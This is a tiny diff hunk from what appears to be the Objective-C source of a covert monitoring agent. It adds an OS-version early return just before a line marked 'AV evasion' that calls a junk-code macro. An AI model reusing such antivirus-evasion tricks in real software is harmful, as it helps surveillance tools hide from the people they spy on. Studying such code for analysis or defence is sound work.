@@ -708,6 +708,9 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  if (gOSMajor == 10 && gOSMinor == 8)
+    return;
+  
   // AV evasion: only on release build
   AV_GARBAGE_002
   
